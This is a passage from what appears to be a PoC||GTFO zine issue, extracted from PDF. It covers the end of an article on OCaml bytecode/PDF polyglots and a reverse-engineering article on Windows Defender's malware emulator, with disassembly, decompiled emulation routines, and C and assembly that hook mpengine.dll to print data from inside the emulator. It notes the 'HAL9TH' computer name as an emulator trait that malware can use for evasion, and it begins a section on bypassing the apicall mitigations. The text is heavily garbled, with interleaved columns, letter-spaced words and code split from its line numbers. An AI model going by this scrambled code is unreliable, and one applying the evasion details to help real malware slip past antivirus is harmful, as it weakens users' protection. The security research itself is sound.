about PDF internals and how much we can abuse
them. Any questions on the matter should be di-
rected to the Funky File Supervisor, Ange Albertini.
The Portable Document Format is a text-based
format which is also read from the end with an in-
dex of all the blocks (objects) in the file and their
offsets. Blocks can point to other blocks, and can
contain various pieces of data, such as text or ref-
erences, but also binary streams that are used for
fonts and pictures. Unlike the OCaml virtual ma-
chine, PDF readers are rather flexible when inter-
preting PDF files; indeed, they are nearly as toler-
ant of awkward dialects and outright syntax errors
as HTML4 browsers!
Concretely, this means that PDF files do not
have to begin at the beginning nor end at the end of
the file. In addition to these classical shenanigans,
Ange Albertini showed in PoCkGTFO 4:12 that you
can create a PDF file that contains a ZIP that is
both accessible directly with unzip and also through
Acrobat Reader’s file attachment feature. This is
done by adding a binary stream that contains the
file, then adding some carefully crafted metadata
and a trailer.
58 unzip
59 If
pocorgtfo19.pdf caml-instructions.pdf caml-formats.pdf
not, what are you doing here? Go memorize the previous editions by heart! Shoo, shoo!
62Proof of Camels Yo Dawg, I heard you liked polyglots
We now have all the ingredients, let’s make a PoC!
We start with a regular LaTeX file, in which we em-
bed the content using Ange’s trick: Having an OCaml tool to smash PDFs and byte-
codes together, we can compile that tool to byte-
code, and smash it together with a PDF describing
the tool itself!
This is in fact slightly more delicate that ex-
pected. Camlpdf relies on custom C code for en-
cryption and compression, which can’t be embedded
in normal bytecode. Instead, the OCaml compiler
adds ELF metadata in the bytecode to include the
C symbols (thus creating a polyglot!). It might be
possible to combine everything together, but we can
also simply disable these features.
But what if we want more polyglots? The ques-
tion of which formats are polyglot-compatible in the
general case is a fairly interesting one. Bytecode
and ZIP both require a trailer at the end of the file,
and are thus incompatible. However, both are com-
patible with header-based formats, such as images.
Additionally, as long as the other formats have com-
ments (or binary contents; that’s obviously the same
thing, isn’t it?), we can interleave them with OCaml
bytecode. The next step is to extend the byte-
pdf tool to make JPEG-PDF-bytecode polyglots.
We might also consider OCaml bytecode chimeras,
which contain some format in their DATA section,
but are also valid files for using this format without
duplication. As before, this should be possible with
any header-based format that uses offsets.
And now, dear readers, I hope you know what
to do for your next research paper(s)!
\ i m m e d i a t e \ p d f o b j s t r e a m a t t r {/ Type / E m b e d d e dF i l e }
f i l e { c l e a n . byte }
\ i m m e d i a t e \ p d f o b j {<<
/ Type / F i l e s p e c /F ( t h i n g . b y t e ) /EF <</F \ t h e \
p d f l a s t o b j \ s p a c e 0 R>>
>>}
\ pdfannot {
/ S u b t y p e / F i l e A t t a c h m e n t /FS \ t h e \ p d f l a s t o b j \ s p a c e 0 R
/F 2 % F l a g : Hidden
}
Our bytecode file ocaml.byte is now embedded
as an attached file that can be accessed in Acrobat
Reader. We then add a suffix that contains an in-
dex with an additional section, PDFX, that will have
the exact length from the beginning of the normal
index up to the end of the PDF. Since the bytecode
interpreter ignores unknown sections, this is a valid
OCaml bytecode file. Since the index is very small,
the file is also a valid PDF. 60
Vulgaris Camelus documentum
PoCs are nice, but libraries are better! Let’s
make a tool that takes an arbitrary PDF, an ar-
bitrary OCaml bytecode program, and smashes
them together. Fortunately, OCaml already has
high-quality libraries for dealing with both formats,
namely camlpdf 61 and obytelib. 62 We simply need
to grab both files, decompose their structure, make
some creative interleavings, and recompose the in-
dex to have all the right indices and offsets according
to the technique revealed above. Easy peasy! 63
Since the content of the binary stream containing
the bytecode must be kept intact, we must take care
to disable many traditional optimizations for stream
content, most notably compression and reencoding
for that stream. The original PDF can be of arbi-
trary shape and provenance.
60 git
clone
clone
62 git clone
63 git clone
61 git
https://github.com/Drup/polyocamlbyte || unzip pocorgtfo19.pdf polyocamlbyte.zip
https://github.com/johnwhitington/camlpdf/ || unzip pocorgtfo19.pdf camlpdf.zip
https://github.com/bvaugon/obytelib || unzip pocorgtfo19.pdf obytelib.zip
https://github.com/Drup/bytepdf || unzip pocorgtfo19.pdf bytepdf.zip
6319:12
Inside the Emulator of Windows Defender
by Alexei Bulazel
Background
Antivirus emulators are for used dynamic anal-
ysis of unknown potentially malicious binaries on
endpoint computer systems. As modern malware is
often packed, obfuscated, or otherwise transformed
to make signature-based classification difficult, em-
ulation is an essential part of any modern antivirus
(AV). During emulation, binaries are loaded and run
in an emulator which emulates a CPU, an operating
system, and a computer environment (settings, files,
etc.), among other facilities. Runtime instrumenta-
tion allows antivirus software to make heuristic or
signature-based determinations about the potential
malware it is emulating - the binary may use cer-
tain operating system APIs that heuristically indi-
cate malicious intent, or it may unpack or drop a
known signed binary. Unfortunately, while AV use
of emulators for dynamic analysis is well known, few
researchers have published analysis of their inner
workings. As it brings together all the challenges
and excitement of understanding instruction set ar-
chitectures, operating system internals, malware be-
havior, and antivirus itself, emulator analysis is a
fascinating topic in reverse engineering.
The core of the Windows Defender Antivirus is an
enormous 45 thousand function, eleven megabyte li-
brary, mpengine.dll. Deep within this huge DLL, a
proprietary emulator provides facilities for dynamic
analysis of potentially malicious Windows PE bina-
ries on the endpoint.
Many AVs are difficult to analyze due to
practical hurdles to reverse engineering such
as anti-debugging, GUI-only interfaces, cus-
tom non-standard binary formats, and enormous
disassembler-breaking functions. These challenges
are all surmountable (kernel debuggers, custom har-
nesses, bespoke IDA / Binary Ninja loaders, and
additional RAM), but they can be a major im-
pediment to analysis. Joxean Koret has done some
tremendous and under-appreciated work on address-
ing these challenges, interested readers are referred
to the Antivirus Hacker’s Handbook.
Fortunately, Defender is one of the easiest AVs
to analyze that I have encountered - it does run
as a Windows Protected Process (so it cannot be
debugged by another usermode program), and its
binary is massive, but otherwise it is fairly easy to
work with. Microsoft’s publication of mpengine.dll
PDBs is also a tremendous help in reverse engineer-
ing efforts.
The fact that emulators generally do not provide
output other than malware identification makes it
difficult to follow their execution without actually
debugging them. While previous work on AVLeak
from Jeremy Blackthorne, I, and several other col-
laborators at RPI showed the potential for exploit-
ing malware identification as a side channel to exfil-
trate data from within emulators, this technique is
slow (generally less than 10 bytes per-second) and
only effective for exfiltration of artifacts from within
emulators that remains static from execution to ex-
ecution. 64
Debugging emulators and setting breakpoints on
functions of interest can allow for tracing of pro-
gram flow. (E.g., is the malware actually getting
emulated? Is execution stopping after a particular
API call?) Breakpoint-based debugging can get con-
fusing when emulators have complex initialization
In this article, I’ll share three tricks and anec-
dotes from my research into Windows Defender An-
tivirus’ emulator. While the term Defender now
seems to refer to any security tool or mitigation
built into Windows, we’ll be looking specifically at
the Antivirus product, the first to bear to the De-
fender name, and a default free install on Windows.
The tricks I’ll be sharing are Defender specific, but
the astute hacker will be able to generalize them to
other AVs.
We’ll take a look at the mechanisms Defender
uses to implement native OS API function emula-
tion, and then present three related reverse engineer-
ing tricks: 1) how reverse engineers can establish an
output channel to help them observe emulator state
from outside of the emulator; 2) how we can bypass
Microsoft’s attempted mitigations against abuse of
the emulator’s custom apicall instruction; and 3)
writing IDA tooling to help us load Defender VDLL
binaries that use the apicall instruction.
64 For example, some AVs may randomize certain traits of the execution environment with each run. If only a single byte can
be extracted with each run, researchers can’t extract multi-byte traits.
64and teardown routines that invoke functions of in-
terest unrelated to actual malware execution, as is
the case with Windows Defender. I would note that
I’ve found code coverage exploration tools, such as
a customized version of Markus Gaasedelen’s Light-
house to be extremely helpful in understanding the
big picture of emulator execution. 65
While Defender supports other architectures and
binary formats, this article will focus solely on em-
ulator support for 32-bit Windows PE executables.
Readers interested in other dynamic analysis facili-
ties in Defender can check out my REcon Brussels
2018 presentation on Defender’s JavaScript engine.
right directories, they can be loaded with LoadLi-
brary, etc. Like real DLLs, they are compiled x86
code, and they run at the same privilege level, with
the same stack, registers, and other facilities as the
code invoking them - it just happens that this is go-
ing on within a virtualized emulated process running
on an emulated CPU.
On a real Windows system, some DLL func-
tions may ultimately resolve to triggering system
calls where interaction with the kernel is necessary
(e.g., when writing a file to disk, opening a net-
work socket, putting the process to sleep, etc.), while
others may stay in usermode and simply set re-
turn values or transform input. (E.g., grabbing the
IsDebuggerPresent flag off the PEB, translating a
string to uppercase, or performing a memcpy.) Sim-
ilarly, Defender’s VDLLs may trap into special na-
tively implemented emulation routines akin to per-
forming system calls, or they may stay executing
solely within emulator memory while setting return
values or manipulating input.
Lets take a look at the simpler form of VDLL em-
ulated functions - those which stay executing in em-
ulator memory without trapping out to a special ker-
nel syscall-like emulation routine implemented in na-
tive code. Figure 5 shows Defender’s kernel32.dll
VDLL emulation of kernel32!GetComputerNameW.
When a malware binary calls GetComputerNameW,
this code provides emulation of the function with
x86 code that simply runs on the virtual CPU. As
we can observe, this routine is hardcoded to return
the string “HAL9TH” - evidently the developer who
wrote this emulation was a fan of Arthur C. Clarke.
This particular trait could be used by malware to
evade the Defender emulator, e.g., malware seeing
the computer name “HAL9TH” could choose not to
run, knowing that it is likely being emulated by De-
fender.
Having looked at simple, in-emulator, VDLL
routines, we can now look at more complex rou-
tines that require invoking native emulation. These
routines are akin to those OS API functions which
require syscalling in to the kernel. Just like in the
kernel, these routines are used to handle more com-
plex operations, such as interacting with the file sys-
tem, creating threads, or interacting with mutexes
or events.
Whereas on a real system the int or syscall in-
struction and specific register values are used to alert
the kernel that it must service some usermode re-
On Emulator Architecture
AV emulators are generally constructed from three
key components - CPU emulation, operating system
emulation, and a virtual environment. Due to per-
formance and legal licensing concerns, CPU and OS
emulation are usually wholly proprietary and built
on AV-industry developed tooling, not open source
projects like QEMU or WINE.
CPU emulators implement a particular instruc-
tion set architecture in software, so that binary code
can be executed in the emulator. OS emulation is
software-based emulation of operating system facil-
ities - allowing malware to make OS API calls as it
runs. Finally, emulators must emulate a virtual en-
vironment with observable traits such as usernames,
files on disk, and registry entries, among many other
traits. Other than a handful of traits that are acces-
sible from within a processes actual memory space
(e.g., OS build information on the Windows PEB),
most of the virtual execution environment can only
be observed through OS API calls. (Querying for
a username, statting a directory, reading a registry
key, etc.) As a result, OS emulation is often tightly
coupled with virtual environment emulation.
The three tricks addressed here will all touch
upon “VDLLs” (presumably “virtual DLLs”) within
the Defender emulator. VDLLs emulate the func-
tionality of real Windows DLLs (dynamic-link li-
braries) in the Defender emulator, providing emu-
lation of the operating system API, including pre-
senting the virtual execution environment. These
VDLLs are real Windows PE files, and using them is
just like using real Windows DLLs - they are loaded
into the memory space of binaries under emulation,
they are present in the emulated file system in the
65 git
clone https://github.com/gaasedelen/lighthouse
65.
2 .
.
4 .
.
6 .
.
8 .
.
10 .
.
12 .
.
14 .
.
16 .
.
18 .
.
20 .
.
22 .
.
24 .
.
26 .
.
28 .
.
30 .
.
32 .
.
34 .
.
36 .
.
38 .
.
40 .
.
42 .
.
44 .
.
46 .
.
48 .
.
50 .
.
52 .
.
t e x t : 7 C82D0EA
t e x t : 7 C82D0EA
t e x t : 7 C82D0EA
t e x t : 7 C82D0EA
t e x t : 7 C82D0EA
t e x t : 7 C82D0EA
t e x t : 7 C82D0EA
t e x t : 7 C82D0EA
t e x t : 7 C82D0EA
t e x t : 7 C82D0EA
t e x t : 7 C82D0EA
t e x t : 7 C82D0EA
t e x t : 7 C82D0EB
t e x t : 7 C82D0ED
t e x t : 7 C82D0F0
t e x t : 7 C82D0F1
t e x t : 7 C82D0F3
t e x t : 7 C82D0F5
t e x t : 7 C82D0F8
t e x t : 7 C82D0FA
t e x t : 7 C82D0FC
t e x t : 7 C82D101
t e x t : 7 C82D103
t e x t : 7 C82D105
t e x t : 7 C82D106
t e x t : 7 C82D108
t e x t : 7 C82D10A
t e x t : 7 C82D10C
t e x t : 7 C82D112
t e x t : 7 C82D119
t e x t : 7 C82D119
t e x t : 7 C82D119
t e x t : 7 C82D119
t e x t : 7 C82D11B
t e x t : 7 C82D11B
t e x t : 7 C82D11B
t e x t : 7 C82D11C
t e x t : 7 C82D11D
t e x t : 7 C82D120
t e x t : 7 C82D120
t e x t : 7 C82D120
t e x t : 7 C82D120
t e x t : 7 C82D121
t e x t : 7 C82D126
t e x t : 7 C82D127
t e x t : 7 C82D128
t e x t : 7 C82D129
t e x t : 7 C82D12B
t e x t : 7 C82D131
t e x t : 7 C82D133
t e x t : 7 C82D134
t e x t : 7 C82D135
t e x t : 7 C82D135
; =============== S U B R O U T I N E =======================================
; A t t r i b u t e s : bp−based frame
; BOOL _ _ s t d c a l l GetComputerNameW (LPWSTR l p B u f f e r , LPDWORD n S i z e )
p u b l i c GetComputerNameW
GetComputerNameW p r o c n e a r
; DATA XREF: . t e x t : off_7C8547D8
lpBuffer
nSize
= dword p t r
= dword p t r
push
mov
mov
push
test
jz
mov
test
jz
cmp
jbe
push
pop
cmp
jnb
mov
mov
mov
8
0Ch
ebp
ebp , e s p
eax , [ ebp+n S i z e ]
edi
eax , eax
short loc_7C82D119
e d i , [ ebp+l p B u f f e r ]
edi , edi
short loc_7C82D119
eax , 1000 h
short loc_7C82D119
8
ecx
[ eax ] , e c x
short loc_7C82D120
[ eax ] , e c x
eax , l a r g e f s : 1 8 h
dword p t r [ eax+34h ] , 6Fh
loc_7C82D119 :
; CODE XREF: GetComputerNameW+9
; GetComputerNameW+10 . . .
xor
eax , eax
loc_7C82D11B :
; CODE XREF: GetComputerNameW+4B
pop
edi
pop
ebp
retn
8
; −−−−−−−−−−−−−−−−−−−−−−−−−−−−−−−−−−−−−−−−−−−−−−−−−−−−−−−−−−−−−−−−−−−−−−−−−−−
loc_7C82D120 :
push
mov
movsd
movsd
movsd
movsw
mov
xor
inc
pop
jmp
GetComputerNameW endp
; CODE XREF: GetComputerNameW+1E
esi
esi ,
o f f s e t aHal9th_0 ; "HAL9TH"
dword p t r [ eax ] , 7
eax , eax
eax
esi
short loc_7C82D11B
Figure 5. Defender’s in-emulator kernel32.dll VDLL emulation of GetComputerNameW.
66quest, in Defender, a custom non-standard apicall
instruction provides this facility. When the CPU
emulator sees the apicall instruction, it invokes
special native emulation routines to handle emula-
tion of a complex function.
The apicall instruction consists of a three byte
opcode, 0f ff f0, followed by a four byte immedi-
ate indicating a function to emulate. The four byte
immediate value is the CRC32 of the DLL name
in all caps xored with the CRC32 of the function’s
name.
1 0 f f f f0
apicall
is 119 esyscall_t structs, each consisting of a func-
tion pointer to an API emulation function followed
by the corresponding CRC32 value.
These native functions are implemented in De-
fender’s mpengine.dll as native x86 code. Like an
OS kernel, they have privileged full control over pro-
cessing being emulated - they can manipulate mem-
ory, register state, etc. These functions can also in-
teract with internal data emulator data structures,
such as those that store the virtual file system or
heuristic information about malware behavior.
It’s worth noting that since these 119 emu-
lated functions are emulated with native code,
any vulnerabilities in them can allow malware
to break out of the emulator, escalate privilege
to NTAUTHORITY/SYSTEM (which Defender currently
runs as, unsandboxed), and gain code execution
within an AV process itself - unlikely to be flagged
by the AV for any malicious behavior it carries out.
Building files that get consistently emulated dur-
ing scanning can be a challenge. Through a bit of
trial and error, I was able to come up with Visual
Studio build settings to produce Windows executa-
bles that are consistently scanned - this involved
tweaking optimization levels, target OSes, and link-
ing. The Visual Studio project included in this is-
sue gets consistently emulated when I have Defender
scan it. 66
[ f o u r b y t e immediate ]
which r o u t i n e t o e m u l a t e
These apicall functions are spread across De-
fender’s virtual DLLs and used to trigger the more
complex emulation certain functions may require.
For example, the code below is used to trigger De-
fender’s native emulation of the Sleep. This func-
tion with the actual apicall instruction is called by
kernel32!SleepEx, which can be called directly, or
by kernel32!Sleep, which is basically just a wrap-
per around kernel32!SleepEx. The same is true
on a real Windows system.
8B
2 E8
83
4 0F
50
6 33
58
8 C2
FF
00 00 00 00
C4 04
FF F0 B6 BE 79 57
C0
04 00
mov
call
add
apicall
push
xor
pop
retn
edi , edi
$+5
esp , 4
kernel32 ! Sleep
eax
eax , eax
eax
4
Creating an Output Channel
AV software’s usual lack of output can make it par-
ticularly obtuse to approach for reverse engineers.
When scanning a piece of potential malware, the AV
will often respond with a malicious or not malicious
classification, but little else. Naming conventions in
identifying the malware may provide some indica-
tion of how it was scanned. (For example, seeing
the identification “Dropper:[malware name]” is a
strong indication that the malware was run in the
AV’s emulator, where it dropped a known piece of
malware.)
The prior AVLeak research showed how malware
identification itself may be exploited as a side chan-
nel to leak information out from these emulators,
but this approach is generally only useful for AV
evasion. (For example, creating malware that looks
for particular unique identifiers in these emulated
systems in order to know that it is being analyzed
so it can then behave benignly.) This approach is
When the virtual CPU emulator sees the cus-
tom apicall opcode run, it ends up calling
out through several functions until it ends up
at __call_api_by_crc(pe_vars_t *v, unsigned
int apicrc). In this function, pe_vars_t *v is
an enormous (almost half a megabyte) struct hold-
ing all the information needed to manage the em-
ulator’s state during emulation. unsigned int
apicrc is the immediate of the apicall instruction,
crc32(dll name in all caps) ⊕ crc32(name
of function). From here, the emulator searches
the the global g_syscalls array for a function
pointer that provides native emulation of the CRCed
API function. As can be seen in Figure 6, the array
66 unzip
pocorgtfo19.pdf defender.zip
675A129BA8 ; e s y s c a l l _ t g _ s y s c a l l s [ 1 1 9 ]
2 5A129BA8 g _ s y s c a l l s dd o f f s e t ?NTDLL_DLL_NtSetEventWorker@@YAXPAUpe_vars_t@@@Z
5A129BAC
dd 5 F2823h
4 5A129BB0
dd o f f s e t ?NTDLL_DLL_NtResumeThreadWorker@@YAXPAUpe_vars_t@@@Z
5A129BB4
dd 2435AE3h
6 5A129BB8
dd o f f s e t ?NTDLL_DLL_NtSetInformationFileWorker@@YAXPAUpe_vars_t@@@Z
5A129BBC
dd 2DA9326h
8 5A129BC0
dd o f f s e t ?ADVAPI32_DLL_RegDeleteValueW@@YAXPAUpe_vars_t@@@Z
5A129BC4
dd 6 A61690h
Figure 6. Definition of g_syscalls consisting of 119 esyscall_t structs.
also slow as it extracts information at the rate of
bytes per second. Finally, AVLeak requires multi-
ple rounds of malware scanning to extract complex
multi-byte artifacts. This is fine for most artifacts of
interest, such as usernames, timing measurements,
and API call results, but some interesting artifacts
may be randomized per run or too long to dump,
such as bytes of library code after standard func-
tion prologues in Kaspersky AV’s emulated DLLs or
complete files from disk.
After seeing me present my AVLeak side channel
research, my friend Mark suggested using function
hooking to create a much larger bandwidth chan-
nel from within AV emulators to the outside. By
hooking the native code-implemented functions in-
side the emulator’s g_syscalls array, and then in-
voking those hooked functions with malware inside
the emulator using arguments we’d like to pass to
the outside world, we can effectively create an out-
put channel for sharing information from inside.
In general, this technique requires solving the
non-trivial technical challenge of actually locating
emulation routines in memory, writing code to hook
them, and then figuring out how to extract emu-
lated parameters and potentially memory contents
from the emulator. In the case of Windows Defender
however, this is relatively easy, as these functions are
conveniently labeled by Microsoft provided symbols,
and the existing code already present gives us a good
example to work off of.
While the in-emulator VDLL emulation func-
tions can simply interact directly with memory in-
side the emulator, these native emulations func-
tions must use APIs to programmatically change
emulator state via the pe_vars_t *v parameter
which all of them take. We can see an example of
this in Figure 7’s annotated Hex-Rays decompila-
tion of kernel32!WinExec. Note how parameters
are pulled out from the current emulation session,
and parameter 0 (LPCSTR lpCmdLine) is a pointer
within the emulator’s virtual address space and
must be handled through with pe_read_string_ex
in order to retrieve the actual wide string at the
supplied emulator address.
Reversing out how pe_read_string_ex and
other APIs used to map in parameter-provided
pointers, we come across the massive function:
BYTE * __mmap_ex(pe_vars_t *v, unsigned
int size, unsigned __int64 addr, unsigned
int rights), which returns a native pointer to a
virtual memory inside an emulation session. Given
this pointer, native code can now reach in and read
or write (depending on rights) memory inside the
emulator.
With our understanding of function emulation
and memory management, we now have the tools
to create a simple output channel from within the
emulator. We begin with a simple function, one
that is well suited to serve as an output chan-
nel: kernel32!OutputDebugStringA. Defender’s
provided native function of the function basically
does nothing, it just retrieves its single parameter
and bumps up the emulator tick count:
1 void __cdecl KERNEL32_DLL_OutputDebugStringA
( pe_vars_t ∗v ) {
3
Parameters <1> a r g ; // [ e s p+4h ] [ ebp−Ch ]
5
7 }
68
Parameters <1 >:: Parameters <1>(&arg , v ) ;
v−>m_pDTc −>m_vticks64 += 32 i 6 4 ;1 /∗
Emulation o f UINT WINAPI WinExec ( _In_ LPCSTR lpCmdLine , _In_ UINT uCmdShow) ;
3 ∗/
void __cdecl KERNEL32_DLL_WinExec( pe_vars_t ∗v )
5 {
DT_context ∗pDTc ; // e c x
7
unsigned __int64 v2 ; // [ e s p+0h ] [ ebp −54h ]
CAutoVticks v t i c k s ; // [ e s p +10h ] [ ebp −44h ]
9
s r c _ a t t r i b u t e _ t a t t r ; // [ e s p+1Ch ] [ ebp −38h ]
unsigned i n t Length ; // [ e s p +30h ] [ ebp −24h ]
11
Parameters <2> a r g ; // [ e s p +34h ] [ ebp −20h ]
i n t unused ; // [ e s p +50h ] [ ebp −4h ]
13
v t i c k s . m_vticks = 3 2 ;
15
pDTc = v−>m_pDTc;
v t i c k s . m _ i n i t _ v t i c k s = &v−>v t i c k s 3 2 ;
17
v t i c k s .m_pC = pDTc ;
unused = 0 ;
19
// P u l l two p a r a m e t e r s o f f t h e s t a c k from v i n t o t h e l o c a l Parameters a r r a y a r g .
21
// This f i r s t parameter i s j u s t t h e l i t e r a l raw v a l u e found on t h e s t a c k , i n t h i s case ,
// i t ’ s an LPCSTR, b u t / i n t h e e m u l a t o r / , so i t ’ s a p o i n t e r i n t h e e m u l a t o r s
23
// v i r t u a l a d d r e s s s p a c e . The s e co n d parameter i s a u n s i g n e d i n t e g e r , so
// t h e parameter v a l u e i s l i t e r a l l y j u s t t h a t i n t e g e r
25
Parameters <2 >:: Parameters <2>(&arg , v ) ;
27
// s e t r e t u r n v a l u e t o 1
29
pe_set_return_value ( v , 1 u i 6 4 ) ;
31
∗& a t t r . f i r s t . l e n g t h = 0 ;
∗& a t t r . s e c o n d . l e n g t h = 0 ;
33
attr . a t t r i b i d = 12291;
a t t r . s e c o n d . numval32 = 0 ;
35
Length = 0 ;
37
// t r a n s l a t e t h e parameter 0 p o i n t e r i n t o a r e a l n a t i v e p o i n t e r t h a t
// t h e e m u l a t o r can i n t e r a c t w i t h
39
a t t r . f i r s t . numval32 = pe_read_string_ex ( v , a r g . m_Arg [ 0 ] . v a l 6 4 , &Length , v2 ) ;
41
43 a t t r . f i r s t . l e n g t h = Length ;
__siga_check ( v , &a t t r ) ;
45 // e m u l a t e c r e a t i n g a new p r o c e s s , do v a r i o u s AV i n t e r n a l s t u f f
47 v t i c k s . m_vticks = p e _ c r e a t e _ p r o c e s s ( v , a r g . m_Arg [ 0 ] . v a l 3 2 , 0 i 6 4 , v2 ) != 0 ? 16416 : 1 0 5 6 ;
CAutoVticks : : ~ CAutoVticks(& v t i c k s ) ;
49 }
Figure 7. Annotated Hex-Rays decompilation of the emulated kernel32!WinExec.
69We are going to implement our own function to
replace KERNEL32_DLL_OutputDebugStringA that
will actually print output to stdout so that we can
pass information from inside of the emulator to the
outside world.
We begin engineering by pulling down a copy of
Tavis Ormandy’s LoadLibrary, an open source har-
ness that allows us to run mpengine.dll on Linux. 67
LoadLibrary parses and loads the mpengine.dll
Windows PE into executable memory on Linux, and
patches up the import address table to functions
providing simple emulation of the Windows API
functions that Defender invokes. Once loaded, the
engine is initialized, and scanning is invoked by call-
ing Defender’s __rsignal function, which takes in-
put and directs it to various AV scanning subsys-
tems. While this research could also easily be done
with a custom Windows harness for Defender, Tavis’
tool is readily accessible and easy to use. Once we
have LoadLibrary working, we can easily modify it
to manipulate the loaded mpengine.dll library in
memory.
Our first step is to hook the KERNEL32_DLL_-
OutputDebugStringA function. As the function is
only ever invoked via function pointer, it’s easi-
est to simply replace the function pointer in the
g_syscalls array. We can write our own function
with the same __cdecl calling convention that sim-
ply takes a void * and put a pointer to it in the
g_syscalls table, replacing the original pointer to
KERNEL32_DLL_OutputDebugStringA. Copying how
the real Defender code does things, we call the Pa-
rameters<1>::Parameters<1> function to retrieve
the one parameter passed to the function - this can
be done easily by simply locating the function in the
DLL, creating a correctly typed function pointer to
it, and calling it as shown in Figure 8.
Running this code produces some basic output:
odd optimized calling convention: pe_vars_t *v
is passed in register ecx (like the thiscall con-
vention), but then unsigned int size is passed in
edx. I found the easiest way to get around this was
to simply write my own a bit of x86 assembly we can
trampoline through to get to it as shown in Figure 9.
Now we can add these calls to e_mmap into
our code so that we can retrieve strings passed to
OutputDebugStringA to obtain the implementation
in Figure 10. Running this code yields our desired
functionality:
OutputDebugStringA
OutputDebugStringA p a r a m e t e r : 0 x4032d8 −>
H e l l o World ! This i s coming from i n s i d e
the emulator !
With this hook now set up, we have an easy
way to pass information from within the emulator
to outside of it. Exploring the environment inside
the emulator is now as easy as literally printing to
the terminal.
Using the APIs and techniques demonstrated to
create a two-way IO channel where we can give in-
put to the malware running inside the emulator (for
example, to generate fuzzer test cases for emulated
APIs on the outside and pass them to a malware
binary on the inside) is left as an exercise for the
reader.
1 OutputDebugStringA c a l l e d !
OutputDebugStringA p a r a m e t e r : 0 x4032d8
Simply knowing what parameters were passed
to the function is nice, but not incredible use-
ful. Copying the techniques used in other De-
fender native API emulation functions, we can use
__mmap_ex to translate this virtual pointer to a real
native pointer that we can read from. Unfortu-
nately, calling __mmap_ex is not as painless as call-
ing Parameters<1>::Parameters<1> as it has an
67 git
clone https://github.com/taviso/loadlibrary
701 s t a t i c void __cdecl KERNEL32_DLL_OutputDebugStringA_hook ( void ∗ v )
{
3
u i n t 6 4 _ t Params [ 1 ] = { 0 } ;
const char ∗ d e b u g S t r i n g ;
5
p r i n t f ( " OutputDebugStringA c a l l e d ! \ n" ) ;
7
P a r a m e t e r s 1 ( Params , v ) ; // c a l l i n g i n t o mpengine . d l l ’ s Parameters <1>:: Parameters <1>
9
p r i n t f ( " OutputDebugStringA p a r a m e t e r : 0x%x\n" , Params [ 0 ] ) ;
11
// don ’ t worry a b o u t bumping t h e t i c k c o u n t
13
return ;
15 }
17 . t e x t : 5 A129E20
. t e x t : 5 A129E24
19 //We ’ l l r e p l a c e
. t e x t : 5 A129E28
21 . t e x t : 5 A129E2C
. t e x t : 5 A129E30
23 . t e x t : 5 A129E34
dd o f f s e t ?KERNEL32_DLL_CopyFileWWorker@@YAXPAUpe_vars_t@@@Z
dd 0B27D5174h
this function pointer :
dd o f f s e t ?KERNEL32_DLL_OutputDebugStringA@@YAXPAUpe_vars_t@@@Z
dd 0B28014BBh
dd o f f s e t ?NTDLL_DLL_NtGetContextThread@@YAXPAUpe_vars_t@@@Z
dd 0B363A610h
25 . . .
27 typedef u i n t 3 2 _ t _ _ t h i s c a l l ( ∗ P a r a m e t e r s C a l l ) ( void ∗ params , void ∗ v ) ;
ParametersCall Parameters1 ;
29 ...
31 u i n t 3 2 _ t ∗ pOutputDebugStringA ;
// g e t t h e r e a l a d d r e s s o f t h e f u n c t i o n p o i n t e r , mpengine . d l l l o a d e d image b a s e + RVA
pOutputDebugStringA = imgRVA(pRVAs−>RVA_FP_OutputDebugStringA ) ;
∗ pOutputDebugStringA = ( u i n t 3 2 _ t ) KERNEL32_DLL_OutputDebugStringA_hook ; // i n s e r t hook
33
35
P a r a m e t e r s 1 = imgRVA(pRVAs−>RVA_Parameters1 ) ;
37 . . .
Figure 8. Early OutputDebugStringA Hook
71Defender defines __mmap_ex as:
2
char ∗ _ _ u s e r c a l l __mmap_ex@<eax >(pe_vars_t ∗v@<ecx >, unsigned __int64 addr ,
unsigned i n t s i z e @ <edx >, unsigned i n t r i g h t s ) ;
We emulate this function through the following call stack:
2
extern void ∗ __cdecl ASM__mmap_ex( void ∗ FP , void ∗ params , u i n t 3 2 _ t s i z e ,
u i n t 6 4 _ t addr , u i n t 3 2 _ t r i g h t s ) ;
4 void ∗ e_mmap( void ∗ V, u i n t 6 4 _ t Addr , u i n t 3 2 _ t Len , u i n t 3 2 _ t R i g h t s )
{
6
// Trampoline t h r o u g h a s s e m b l y w i t h custom c a l l i n g c o n v e n t i o n .
//FP__mmap_ex i s a g l o b a l f u n c t i o n p o i n t e r t o t h e __map_ex f u n c t i o n
8
return ASM__mmap_ex(FP__mmap_ex, V, Len , Addr , R i g h t s ) ;
}
Where the function’s assembly implementation is:
1
3
5
7
9
11
13
ASM__mmap_ex:
push ebp
mov ebp , e s p
mov eax , [ ebp+0x8 ]
mov ecx , [ ebp+0xc ]
mov edx , [ ebp+0x10 ]
push dword [ ebp+0x1c ]
push dword [ ebp+0x18 ]
push dword [ ebp+0x14 ]
c a l l eax
add esp , 0 xc
pop ebp
ret
;
;
;
;
;
;
f u n c t i o n p o i n t e r to c a l l
pe_vars_t v
unsigned i n t s i z e
unsigned i n t r i g h t s
unsigned __int64 addr h i
unsigned __int64 addr low
Figure 9. Calling __mmap_ex with the unique calling convention.
1
3
5
s t a t i c void __cdecl KERNEL32_DLL_OutputDebugStringA_hook ( void ∗ v )
{
u i n t 6 4 _ t Params [ 1 ] = { 0 } ;
char ∗ d e b u g S t r i n g ;
DWORD l e n = 0 ;
7
p r i n t f ( " OutputDebugStringA \n" ) ;
GetParams ( v , Params , 1 ) ;
9
d e b u g S t r i n g = e_mmap( v , Params [ 0 ] , 0 x1000 , E_RW) ;
11
p r i n t f ( " OutputDebugStringA p a r a m e t e r : 0x%x −> %s \n" , Params [ 0 ] , d e b u g S t r i n g ) ;
13
return ;
15
}
Figure 10. Final implementation of the OutputDebugStringA hook.
72ret2apicall
tually dispatches to a native API emulation handler
look if the instruction is being run from a VDLL
page (is_vdll_page), and if not, if it is a dynamic
page (mmap_is_dynamic_page). Using the instruc-
tion can even trigger a call to MpSetAttribute in-
forming Defender that it was used - likely a very
strong heuristic indicator of malicious intent.
As previously discussed, the apicall opcode (0f ff
f0) is custom addition to Defender’s CPU emulator
used to trigger calls to native API emulation rou-
tines stored in the g_syscalls array. While these
native API emulation routines include complex-to-
emulate but standard Window APIs (NtWriteFile,
ReadProcessMemory, VirtualAlloc, etc.), there
are also a number of unique, Defender-specific 1 . . .
( ! i s _ v d l l _ p a g e ( v5 , v25 ) ) {
functions reachable with the apicall instruction. 3 i f v14
= v6 ;
These Defender-specific functions include various
i f ( ! mmap_is_dynamic_page ( v28 , ∗(&v26 −1) )
| | n i d s e a r c h r e c i d ( v29 ) != 1 ) {
